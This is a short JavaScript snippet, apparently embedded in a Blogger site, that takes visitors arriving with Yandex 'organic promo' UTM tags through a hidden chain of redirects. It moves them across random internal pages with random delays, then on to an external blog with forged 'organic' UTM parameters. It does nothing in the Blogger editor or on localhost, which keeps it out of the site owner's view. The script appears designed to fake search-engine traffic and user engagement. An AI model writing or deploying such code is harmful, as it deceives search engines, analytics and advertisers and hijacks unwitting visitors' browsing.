//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.smyslu.ru/2026/01/2026.html",
		"https://www.smyslu.ru/2026/01/blog-post.html",
		"https://www.smyslu.ru/2026/01/blog-post_7.html",
		"https://www.smyslu.ru/2026/01/blog-post_87.html",
		"https://www.smyslu.ru/2026/01/blog-post_94.html",
		"https://www.smyslu.ru/2026/01/blog-post_60.html",
		"https://www.smyslu.ru/2026/01/blog-post_90.html",
		"https://www.smyslu.ru/2026/01/2026_7.html",
		"https://www.smyslu.ru/2026/01/blog-post_11.html",
        "https://www.smyslu.ru/2026/01/blog-post_66.html"
    ];

    const externalLinks = [
    "https://proryvit.ru/2023/09/ai.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/6g.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/iot.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/blog-post_13.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/xr.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/blog-post_44.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/blog-post_67.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://proryvit.ru/2023/09/blog-post_83.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://proryvit.ru/2023/09/blog-post_82.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

